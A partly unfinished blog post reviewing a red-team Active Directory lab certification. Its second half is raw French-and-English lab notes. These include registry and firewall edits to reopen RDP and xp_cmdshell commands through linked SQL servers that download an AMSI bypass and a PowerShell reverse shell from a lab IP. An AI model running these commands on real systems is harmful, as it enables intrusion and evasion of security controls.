---
layout: post
title:  "SecurityTube Advanced Red Team Lab training - How to enumerate"
date:   2020-09-22
category: Certification
excerpt_separator: <!--more-->
---
Hello,  
  
I would like to talk a bit about the [SecurityTube red team labs](https://www.pentesteracademy.com/redlabs), specifically the [Advanced Red Team Lab](https://www.pentesteracademy.com/redteamlab) which leads to the CRTE (Certified Red Team Expert) certification.  
  
Some great [reviews](https://www.google.com/search?q=review+red+team+lab+pentester+academy+%22CRTE%22) are already existing, so i will focus on why i chose this lab and certification. I will give you some hints about how to approach your targets. Most importantly, i would like to introduce you a tool that i developped which will help you during your journey, [Invoke-Recon](https://github.com/phackt/Invoke-Recon).  
<!--more-->

### Context
  
I was looking for a another professional and challenging cert focused on Windows AD. My prerequisites were:  
 - no jeopardy style 
 - real life scenarios which will be found in real engagements
 - a environment not too crowded. I met this situation with others platforms and i spent much of my time contacting the support to revert the VMs because of others bad exploitation or persistence, getting the machines you're working on totally unstable.  
  
Finally the *Advanced Red Team Lab* was the answer. Companies are more and more looking for online qualitative trainings because of the actual sanitary crisis. Think to ask to your company for a financial support.  

### What i really liked  

 - Reactive and helpful support
 - Updated servers and workstations with AV running
 - AD exploitation and local privilege escalation
 - The exploitation paths are consistent and relevant
 - Nikhil Mittal and his team are really friendly and you definitely can contact them on twitter to share your thoughts on this lab

### What should be / will be improved

 - possibility to revert VMs on our own during lab and cert (in dev on their side)
  
### What you will learn
  
Obviously, the difficulty level depends on your experience as a pentester, but be sure that after this cert you will be able to :  
  - Properly enumerate an AD (basic stuff like SPNs, kerberos with no preauth, ...) and which tools to use (think about [lolbas](https://lolbas-project.github.io/))
  - Find AD exploitation paths, weak ACLs
  - Spearphish users  
  - Know how to exploit Kerberos delegation and how the S4U extensions are working (for ex: kerberos constrained delegation with protocol transition)
  - Exploit domain / forest trusts (SID Filtering, SID History, ...)
  - Exploit MSSQL servers (this part was really interesting as i did not have so many opportunities to exploit MSSQL instances during engagements)
  - Many other cool stuff
  

### Hints (that you may not find on others blog posts)

Your will start as domain user on a Windows Server where you will be able to RDP. I advice you to get SYSTEM on this machine, to disable Defender and some restrictive Firewall and AppLocker rules.  
Then take of your shoes and feel comfortable at home.  
  
I mainly used this Windows VM but i also had my Kali. In order to be able to proxyfy my Kali tools, i used [ssf](https://github.com/securesocketfunneling/ssf/releases) and [proxychains](https://translate.google.fr/translate?hl=fr&sl=fr&tl=en&u=https%3A%2F%2Fphackt.com%2Ftor-proxychains).  
  
Sometimes in this lab you will be able to move forward the unintended ways, i mean with your own kind of exploitation (to give you an idea, read this blog post from [itm4n](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)).
Todo:
- recommander de tjs chercher à exploiter comme ils l ont voulu
- ne pas négliger la post exploitation
- d'utiliser les outils suivants
  
Don't forget to note where you struggled at, during the exam it will be a pity to lose time on a thing you already faced.  
  

### Tools

-----------------


-privesc de la machine puis ssf avec proxychains
-Parler des tools utilisés (ceux dans le Rep tools de la VM)
-Parler des façons unintended d avoir pown le lab
-Parler des sites notamment ceux de harmjoy, S4U2Pwnage, ...
-mettre des lignes de commandes utiles (des notes du lab, de keepnote - powershell et domain local enumeration)
-faire un article sur les commandes MSSQL (RPC OUT, OPENROWSET, EXECUTE AS)
-use maximum les lolbin (lien sur le site des lolbins)
-try to clean after you passed
-netsh pour les pivots
-le trick pour réactiver 3389 sans reboot (le mieux, desactiver winrm, utiliser smbexec en modifiant le port pour pivot 4445, et changer le port TermService sur 5985 car non filtré):
Depuis un WinRM:
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\" -Name PortNumber -Value 5985
New-NetFirewallRule -DisplayName "Remote Desktop - User Mode (TCP-In) 8888" -Direction Inbound –Protocol TCP -Profile Any –LocalPort 8888 -Action allow
New-NetFirewallRule -DisplayName "Remote Desktop - User Mode (UDP-In) 8888" -Direction Inbound –Protocol UDP -Profile Any –LocalPort 8888 -Action allow
sc.exe stop WinRM

Depuis un smbexec:
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
C:\Windows\system32>netstat -an

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING


-ls \\DC\pipe\spoolss

'UFC-SQLDEV' is not configured for RPC OUT.
spoolss DC n'est pas activé sur les DCs, mais l'est sur les serveurs

Get-SQLServerLinkCrawl -Instance ufc-sqldev -Verbose -Query "EXEC xp_cmdshell 'powershell.exe -ep bypass -noprofile -C """"whoami""""'" -QueryTarget AC-DBBUSINESS | Select -ExpandProperty Cus
tomquery

Get-SQLServerLinkCrawl -Instance ufc-sqldev -Verbose -Query "EXEC xp_cmdshell 'powershell.exe -ep bypass -noprofile -C """"New-Object System.Net.Sockets.TcpClient(''192.168.2.90'', ''445'')""
""'" -QueryTarget AC-DBBUSINESS | Select -ExpandProperty Customquery

Get-SQLServerLinkCrawl -Instance ufc-sqldev -Verbose -Query "EXEC xp_cmdshell 'powershell.exe -ep bypass -noprofile -C """"iex (New-Object Net.WebClient).DownloadString(''http://192.168.50.15
3:8080/amsi-bypass.ps1'');[Bypass.A_M_S_I]::Disable();iex (New-Object Net.WebClient).DownloadString(''http://192.168.50.153:8080/nishang/Shells/Invoke-PowerShellTcp.ps1'');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.50.153 -Port
 8888""""'" -QueryTarget AC-DBBUSINESS | Select -ExpandProperty Customquery

EXEC xp_cmdshell 'powershell.exe -ep bypass -noprofile -C "iex (New-Object Net.WebClient).DownloadString(''http://192.168.2.90:8080/amsi-bypass.ps1'');[Bypass.A_M_S_I]::Disable();iex (New-Object Net.WebClient).DownloadString(''http://192.168.2.90:8080/nishang/Shells/Invoke-PowerShellTcp.ps1'');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.2.90 -Port 8888"'

Get-ChildItem -Path .\ -Filter dbbackup.sql -Recurse -ErrorAction SilentlyContinue -Force
Invoke-Sq